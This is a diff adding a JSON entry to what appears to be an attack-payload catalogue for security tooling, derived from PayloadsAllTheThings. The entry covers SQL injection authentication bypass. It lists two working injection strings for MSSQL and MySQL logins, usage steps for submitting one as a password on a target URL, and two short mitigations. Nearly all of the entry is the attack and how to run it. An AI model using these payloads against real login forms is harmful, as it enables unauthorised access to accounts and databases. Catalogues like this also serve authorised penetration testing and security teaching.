@@ -1,0 +1,50 @@
+{
+  "id": "payload_000001",
+
+  "important": {
+    "title": "SQL injection login bypass",
+    "category": "SQL Injection",
+    "sub_category": "Authentication Bypass",
+    "tags": ["database", "login", "auth", "sql"],
+    "targets": {
+      "os": ["Any", "Windows", "Linux"],
+      "system": ["Web App", "MySQL", "MSSQL"]
+    },
+    "risk": "medium"
+  },
+
+  "variants": [
+    {
+      "match": { "os": ["Windows"], "system": ["MSSQL"] },
+      "payload": "' OR 1=1 --",
+      "notes": "Classic form-based login, MSSQL backend"
+    },
+    {
+      "match": { "os": ["Linux","Any"], "system": ["MySQL"] },
+      "payload": "' OR '1'='1' -- ",
+      "notes": "MySQL tolerant to quotes"
+    }
+  ],
+
+  "usage": {
+    "steps": [
+      "Open login page",
+      "Enter any username",
+      "Use payload as password and submit"
+    ],
+    "required_params": {
+      "target_url": { "required": true, "example": "https://site.com/login" },
+      "field_names": { "required": false, "example": { "user": "username", "pass": "password" } }
+    },
+    "mitigations": [
+      "Use parameterized queries",
+      "Validate inputs"
+    ],
+    "references": ["PayloadsAllTheThings/SQLi"]
+  },
+
+  "system": {
+    "version": "2.0.0",
+    "source": "PayloadsAllTheThings"
+  }
+}
